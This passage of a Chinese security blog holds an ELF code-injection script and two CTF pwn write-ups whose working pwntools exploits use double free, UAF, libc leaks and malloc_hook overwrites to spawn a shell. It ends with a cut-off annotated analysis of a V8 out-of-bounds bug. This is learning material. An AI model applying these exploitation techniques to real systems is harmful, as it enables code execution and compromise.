st_name</span><br><span class="line">            <span class="keyword">while</span> self.bin[idx] != <span class="number">0</span>:</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">            name = self.bin[dynstr_offset+st_name:idx]</span><br><span class="line">            plt_address_offset = plt_offset + ((i - rel_plt_offset) // rel_plt_entSize + <span class="number">1</span>) * plt_entSize</span><br><span class="line">            plt_address = (self.entry&amp;~<span class="number">0xfffff</span>)+plt_address_offset</span><br><span class="line">            md = Cs(self.arch, self.mode)</span><br><span class="line">            code = self.bin[plt_address_offset:plt_address_offset+plt_entSize]</span><br><span class="line">            <span class="keyword">for</span> disasm <span class="keyword">in</span> md.disasm(code, plt_address):</span><br><span class="line">                <span class="keyword">if</span> disasm.id == X86_INS_PUSH:</span><br><span class="line">                    opstr = disasm.op_str</span><br><span class="line">                    <span class="keyword">if</span> self.mode == CS_MODE_64:</span><br><span class="line">                        <span class="keyword">if</span> int(opstr, <span class="number">16</span>) != (i - rel_plt_offset) // rel_plt_entSize:</span><br><span class="line">                            <span class="keyword">raise</span> Exception(<span class="string">"Error when find plt!"</span>)</span><br><span class="line">                    <span class="keyword">elif</span> self.mode == CS_MODE_32:</span><br><span class="line">                        <span class="keyword">if</span> int(opstr, <span class="number">16</span>) != i - rel_plt_offset:</span><br><span class="line">                            <span class="keyword">raise</span> Exception(<span class="string">"Error when find plt!"</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            plt = Plt_struct(plt_address, got_address, name)</span><br><span class="line">            self.plt.append(plt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InsertOpcode</span><span class="params">(self, opcode)</span>:</span></span><br><span class="line">        <span class="comment"># make the length align to 0x10</span></span><br><span class="line">        code_length = self.align(opcode)</span><br><span class="line">        <span class="comment"># I will add a section at the end of the file, and then add program header to the end</span></span><br><span class="line">        <span class="comment"># and then add a LOAD segment</span></span><br><span class="line">        modifiedSize = len(self.bin) + \</span><br><span class="line">            (len(self.programHeaders)+<span class="number">1</span>)*self.elfHeader.e_phentsize + \</span><br><span class="line">            code_length + self.elfHeader.e_shentsize</span><br><span class="line">        self.modifiedBin = []        <span class="comment"># pack function is to change ctypes struct into bytearray</span></span><br><span class="line">        <span class="keyword">if</span> self.mode == CS_MODE_64:</span><br><span class="line">            tmpElfHeader = Elf64_Ehdr.from_buffer_copy(self.pack(self.elfHeader))</span><br><span class="line">            addedSegment = Elf64_Phdr.from_buffer_copy(self.pack(self.getLOADSegment()))</span><br><span class="line">        <span class="keyword">elif</span> self.mode == CS_MODE_32:</span><br><span class="line">            tmpElfHeader = Elf32_Ehdr.from_buffer_copy(self.pack(self.elfHeader))</span><br><span class="line">            addedSegment = Elf32_Phdr.from_buffer_copy(self.pack(self.getLOADSegment()))</span><br><span class="line"></span><br><span class="line">        tmpElfHeader.e_phoff = len(self.bin)</span><br><span class="line">        <span class="comment"># add function is to add the bytearray of string into the third arg's point</span></span><br><span class="line">        self.add(self.modifiedBin, self.pack(tmpElfHeader), <span class="number">0</span>)</span><br><span class="line">        elfHeaderLength = len(self.pack(tmpElfHeader))</span><br><span class="line">        self.add(self.modifiedBin, self.bin[elfHeaderLength:], self.modifiedPos)</span><br><span class="line">        code_offset = self.modifiedPos + tmpElfHeader.e_phnum * tmpElfHeader.e_phentsize</span><br><span class="line">        code_offset = code_offset + (<span class="number">0x1000</span> - code_offset % <span class="number">0x1000</span>)</span><br><span class="line">        code_address = <span class="number">0x10000</span> + code_offset</span><br><span class="line">        <span class="comment"># add the added section</span></span><br><span class="line">        <span class="comment"># add program headers</span></span><br><span class="line">        <span class="keyword">for</span> segment <span class="keyword">in</span> self.programHeaders:</span><br><span class="line">            <span class="keyword">if</span> segment.p_type != <span class="number">4</span>:</span><br><span class="line">                self.add(self.modifiedBin, self.pack(segment), self.modifiedPos)</span><br><span class="line">        addedSegment.p_offset = code_offset</span><br><span class="line">        addedSegment.p_vaddr = code_address</span><br><span class="line">        addedSegment.p_paddr = code_address</span><br><span class="line">        addedSegment.p_filesz = code_length</span><br><span class="line">        addedSegment.p_memsz = <span class="number">0x1000</span></span><br><span class="line">        addedSegment.p_align = <span class="number">8</span></span><br><span class="line">        addedSegment.p_flags = <span class="number">7</span></span><br><span class="line">        <span class="comment"># add the added segment</span></span><br><span class="line">        self.add(self.modifiedBin, self.pack(addedSegment), self.modifiedPos)</span><br><span class="line">        <span class="comment"># add code</span></span><br><span class="line">        self.add(self.modifiedBin, <span class="string">'\x00'</span>*(code_offset-self.modifiedPos), self.modifiedPos)</span><br><span class="line">        self.add(self.modifiedBin, opcode.ljust(code_length, <span class="string">'\x00'</span>), self.modifiedPos)</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'patch'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(bytearray(self.modifiedBin))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./a'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    elf = ELF(f.read())</span><br><span class="line">    opcode = <span class="string">'\xe8\x0b\xf9\xff\xff\xe9\xbd\xfb\xff\xff'</span></span><br><span class="line">    elf.InsertOpcode(opcode)</span><br></pre></td></tr></table></figure>

<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>最近用leaf做出来了一个patch的脚本，可以一用</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>ELF</tag>
      </tags>
  </entry>
  <entry>
    <title>PwnHub万圣节公开赛pwn的writeup</title>
    <url>/2019/11/03/PwnHub%E4%B8%87%E5%9C%A3%E8%8A%82%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E7%9A%84writeup/</url>
    <content><![CDATA[<p>比赛的时候没有做出来，最后在队友的全程帮助下做出来了</p>
<p><a href="https://github.com/DayJun/Blogs/tree/master/Articles/PwnHub%E4%B8%87%E5%9C%A3%E8%8A%82" target="_blank" rel="noopener">题目在这</a></p>
<a id="more"></a>

<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/pwnhub/classic&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>喜闻乐见的保护全开</p>
<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><ol>
<li>add</li>
<li>free</li>
<li>xxtea encrypt</li>
</ol>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>free了块之后没有把指针清零，xxtea加密函数会将一个栈地址也加密并把加密后的内容输出</p>
<p>但是没有edit函数，且最多只能申请十个块，除了xxtea加密的函数之外没有任何输出内容的函数</p>
<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>这是队友想到的方法</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>攻击修改top chunk到栈上劫持返回地址执行one_gadget</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./classic'</span></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">xxtea = cdll.LoadLibrary(<span class="string">"./xxtea.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea_decrypt</span><span class="params">(v, n, k)</span>:</span></span><br><span class="line">    xxtea.btea()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, c, d)</span>:</span></span><br><span class="line">    s(<span class="string">'\x01'</span>)</span><br><span class="line">    s(c)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    s(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    s(<span class="string">'\x02'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x90</span>, p64(<span class="number">0</span>), <span class="string">'a'</span>*<span class="number">1</span>)    <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), <span class="string">'a'</span>*<span class="number">1</span>)    <span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), <span class="string">'a'</span>)      <span class="comment">#2</span></span><br><span class="line"><span class="comment">#此时，2块位于0块内，且2块的fd和bk都是libc的地址</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">add(<span class="number">0x70</span>, p64(<span class="number">0</span>), <span class="string">'\x00'</span>)   <span class="comment">#3</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#这样是为了让fastbin中有一个0x56，好把块分配到libc</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), <span class="string">'\x48'</span>)</span><br><span class="line"><span class="comment">#fd的最后一个字节覆盖成块2的地址+8的位置</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), <span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), p64(<span class="number">0x51</span>)+<span class="string">'\x55'</span>)</span><br><span class="line"><span class="comment">#将2块的fd覆盖成0x51，将其bk的最后一个字节覆盖成\x55</span></span><br><span class="line"><span class="comment">#此时的fastbin结构</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; fastbins </span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="string">0x20: 0x0</span></span><br><span class="line"><span class="string">0x30: 0x0</span></span><br><span class="line"><span class="string">0x40: 0x0</span></span><br><span class="line"><span class="string">0x50: 0x557165e90048 —▸ 0x7fd5dce84b55 (main_arena+53) ◂— 0x0</span></span><br><span class="line"><span class="string">0x60: 0x0</span></span><br><span class="line"><span class="string">0x70: 0x0</span></span><br><span class="line"><span class="string">0x80: 0x557165e90130 ◂— 0x0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#而</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/2gx 0x7fd5dce84b55</span></span><br><span class="line"><span class="string">0x7fd5dce84b55 &lt;main_arena+53&gt;:	0x7165e90130000000	0x0000000000000055</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#这个地址离top chunk也很近</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), <span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#这时fastbin中的下一个0x50的块就是libc中的地址了</span></span><br><span class="line">s(<span class="string">'\x03'</span>)</span><br><span class="line">s(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">data = rn(<span class="number">44</span>)</span><br><span class="line">int_arr4 = c_uint*<span class="number">4</span></span><br><span class="line">key = int_arr4()</span><br><span class="line">key[<span class="number">0</span>] = c_uint(<span class="number">0x6854CC6D</span>)</span><br><span class="line">key[<span class="number">1</span>] = c_uint(<span class="number">0x0A4BB7D0E</span>)</span><br><span class="line">key[<span class="number">2</span>] = c_uint(<span class="number">0x660B8F8F</span>)</span><br><span class="line">key[<span class="number">3</span>] = c_uint(<span class="number">0x714829A5</span>)</span><br><span class="line">int_arr44 = c_ubyte*<span class="number">44</span></span><br><span class="line">d = int_arr44()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">44</span>):</span><br><span class="line">    d[i] = c_ubyte(ord(data[i]))</span><br><span class="line">xxtea.btea(d, <span class="number">-0xb</span>, key)</span><br><span class="line">secret = <span class="string">''</span>.join(list(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> d))</span><br><span class="line"><span class="keyword">print</span> secret</span><br><span class="line">stack_address = u64(secret[<span class="number">0x20</span>:<span class="number">0x28</span>])</span><br><span class="line"><span class="comment">#解密xxtea加密的东西，就得到了一个stack_address</span></span><br><span class="line">success(<span class="string">'stack address'</span>, stack_address)</span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0</span>), <span class="string">'aaa'</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(stack_address - <span class="number">0x138</span>))</span><br><span class="line"><span class="comment">#覆盖topchunk到栈上，stack_address-0x138是add函数的返回地址上面0x10的地方</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">gdb.attach(io,<span class="string">'b *$rebase(0xdb2)'</span>)</span><br><span class="line">raw_input()</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0</span>), p64(<span class="number">0xffffffffff600000</span>)*<span class="number">10</span>)</span><br><span class="line"><span class="comment">#0xffffffffff600000是个滑板，可以让栈不停往下滑，直到libc_start_main，然后可以将它的低字节覆盖成one_gadget，此时esp+0x70是Null</span></span><br><span class="line"><span class="comment">#需要爆破一个半字节</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>此法有个问题，就是不稳定。有时会无法劫持top chunk，具体原因我不去深究</p>
<p>但是除非你是欧皇，不然不可能用这个exp来getshell</p>
<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><h2 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h2><p>按照官方的wp，要unsorted bin attack，把malloc_hook覆盖成libc的地址，同时分配块到malloc_hook</p>
<p>引自官方wp</p>
<blockquote>
<p>初看这题似乎可以用house of roman来做，但是该利用方式在unsort bin attack需要后一个edit操作来使得malloc_hook改成one_gadget，而这题除了malloc后紧跟着一个read操作外，并没有一个edit选项。<br>那如何来解决这一问题呢。<br>看libc源码可知，unsort bin在摘链时候，是要判断双链表中的chunk size的。如果size合适，直接将这个chunk从链表中摘除并作为malloc的返回值。利用这一特性，我们可以在一次malloc中同时做到将libc地址写入malloc_hook并且edit malloc_hook的值。<br>我们一步一步来分解这个操作。第一步将libc地址写入malloc_hook中，这并非难事，我们利用unsort bin attack即可，这里不多说。但是如何在发生unsort bin attack后立马可以修改malloc_hook的低几个字节呢（将其修改成one_gadget地址）。这就利用前面所说的unsort bin的摘链特性。<br>首先我们知道，malloc需要unsort bin时，会从双链表的bck开始挨个遍历。我们将第一个chunk的bk指向&amp;malloc_hook - 0x10，这样一来malloc_hook就被写入libc地址。倘若此时在&amp;malloc_hook - 8的位置写入一个合适的size，而malloc是该size的chunk，那就会将&amp;malloc_hook作为malloc的返回值，所以我们可以edit malloc_hook了。<br>需要注意的是，malloc_hook + 8的位置是这个chunk的bck，要写入一个有效地址。因为此题没有直接的leak且开了pie，所以我们需要想办法得到一个可写地址。我在选项3里给了一个xxtea的加密，它的加密函数有个问题，可以多加密8个字节。而这8个字节是个stack地址，bingo，这样我们就得到一个可写地址了。<br>至于如何在malloc_hook - 8的位置写入一个size，这利用fastbin attack，不多解释了。<br>当然了，这一切要在10次malloc之内完成，所以需要小心构造。</p>
</blockquote>
<p>但是，我却遇到了阻碍</p>
<p>就是我怎么也想不出来怎样只用十个块既劫持fd又修改unsorted bin的bk</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>做了一道简单的UAF</title>
    <url>/2019/10/30/%E5%81%9A%E4%BA%86%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84UAF/</url>
    <content><![CDATA[<p>今天同学丢给我了一道堆题</p>
<p>题目链接：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/unknown-choise" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<p>这是一道花里胡哨的堆题</p>
<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><ol start="0">
<li>Exit</li>
<li>Add player</li>
<li>Remove player</li>
<li>Select player</li>
<li>Edit player</li>
<li>Show player</li>
<li>Show team</li>
</ol>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>select操作会把一个player指针赋值给一个全局变量，就算remove了那个player，全局变量依旧存着它的指针，且可以利用edit函数进行操作</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./choise'</span></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(c)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(str(c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, a, b, c, d)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">'Found free slot: '</span>)</span><br><span class="line">    idx = int(ru(<span class="string">'\n'</span>))</span><br><span class="line">    ru(<span class="string">'Enter player name: '</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">'Enter attack points: '</span>)</span><br><span class="line">    sl(str(a))</span><br><span class="line">    ru(<span class="string">'Enter defense points: '</span>)</span><br><span class="line">    sl(str(b))</span><br><span class="line">    ru(<span class="string">'Enter speed: '</span>)</span><br><span class="line">    sl(str(c))</span><br><span class="line">    ru(<span class="string">'Enter precision: '</span>)</span><br><span class="line">    sl(str(d))</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">'Enter index: '</span>)    </span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">'Enter index: '</span>)    </span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(c, arg)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    menu(c)</span><br><span class="line">    ru(<span class="string">'Enter new name: '</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    s(arg)</span><br><span class="line">    sl(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showP</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showT</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x7f</span>+<span class="string">'\n'</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x60</span>+<span class="string">'\n'</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">select(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">showP()</span><br><span class="line">ru(<span class="string">'Name: '</span>)</span><br><span class="line">leak = u64(ru(<span class="string">'\n'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'leak address'</span>, leak)</span><br><span class="line">base = leak - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">'libc base'</span>, base)</span><br><span class="line">libc.address = base</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">chunk_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">one_gadget = base + <span class="number">0xf02a4</span></span><br><span class="line">select(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x60</span>+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(chunk_addr+<span class="number">0xff000000000000</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(chunk_addr)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x60</span>+<span class="string">'\n'</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">-2</span>]+<span class="string">'a'</span>*<span class="number">0x47</span>+<span class="string">'\n'</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">select(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">-2</span>]+<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">-2</span>]+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,'b *0x401949')</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>由v8的Array.prototype.map的实现不当而引发的漏洞</title>
    <url>/2019/10/30/%E7%94%B1v8%E7%9A%84Array-prototype-map%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8D%E5%BD%93%E8%80%8C%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>参考链接：</p>
<ul>
<li><a href="https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/" target="_blank" rel="noopener">https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/</a></li>
</ul>
<a id="more"></a>

<h1 id="查看commit"><a href="#查看commit" class="headerlink" title="查看commit"></a>查看commit</h1><p>commit: <a href="https://chromium.googlesource.com/v8/v8.git/+/192984ea88badc0c02e22e528b1243a9efa46f90" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/192984ea88badc0c02e22e528b1243a9efa46f90</a></p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>结合漏洞发现者的博客，知道漏洞函数是<code>GenerateIteratingArrayBuiltinBody</code></p>
<p>照例写注释</p>
<p>src/builtins/builtins-array-gen.cc</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GenerateIteratingArrayBuiltinBody</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">const</span> BuiltinResultGenerator&amp; generator,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> CallResultProcessor&amp; processor, <span class="keyword">const</span> PostLoopAction&amp; action,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Callable&amp; slow_case_continuation,</span></span></span><br><span class="line"><span class="function"><span class="params">    ForEachDirection direction = ForEachDirection::kForward)</span> </span>&#123;</span><br><span class="line">  Label non_array(this), slow(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;),</span><br><span class="line">      array_changes(<span class="keyword">this</span>, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);</span><br><span class="line">  <span class="comment">// TODO(danno): Seriously? Do we really need to throw the exact error</span></span><br><span class="line">  <span class="comment">// message on null and undefined so that the webkit tests pass?</span></span><br><span class="line">  <span class="function">Label <span class="title">throw_null_undefined_exception</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line">  GotoIf(WordEqual(receiver(), NullConstant()),</span><br><span class="line">         &amp;throw_null_undefined_exception);</span><br><span class="line">  GotoIf(WordEqual(receiver(), UndefinedConstant()),</span><br><span class="line">         &amp;throw_null_undefined_exception);</span><br><span class="line">  <span class="comment">// By the book: taken directly from the ECMAScript 2015 specification</span></span><br><span class="line">  <span class="comment">// 1. Let O be ToObject(this value).</span></span><br><span class="line">  <span class="comment">// 2. ReturnIfAbrupt(O)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 原本的注释也写出来了，就是让 o_ = this</span></span><br><span class="line"></span><br><span class="line">  o_ = CallStub(CodeFactory::ToObject(isolate()), context(), receiver());</span><br><span class="line">  <span class="comment">// 3. Let len be ToLength(Get(O, "length")).</span></span><br><span class="line">  <span class="comment">// 4. ReturnIfAbrupt(len).</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建了一个Tagged变量，也就是标记指针变量，作用是存储数组的长度</span></span><br><span class="line"></span><br><span class="line">  VARIABLE(merged_length, MachineRepresentation::kTagged);</span><br><span class="line">  Label has_length(this, &amp;merged_length), not_js_array(this);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果o_不是JS的Array，则跳到not_js_array分支</span></span><br><span class="line"></span><br><span class="line">  GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;not_js_array);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将数组的长度给与marge_length</span></span><br><span class="line"></span><br><span class="line">  merged_length.Bind(LoadJSArrayLength(o()));</span><br><span class="line">  Goto(&amp;has_length);</span><br><span class="line">  BIND(&amp;not_js_array);</span><br><span class="line">  Node* len_property =</span><br><span class="line">      GetProperty(context(), o(), isolate()-&gt;factory()-&gt;length_string());</span><br><span class="line">  merged_length.Bind(</span><br><span class="line">      CallStub(CodeFactory::ToLength(isolate()), context(), len_property));</span><br><span class="line">  Goto(&amp;has_length);</span><br><span class="line">  BIND(&amp;has_length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// len_就是数组的长度</span></span><br><span 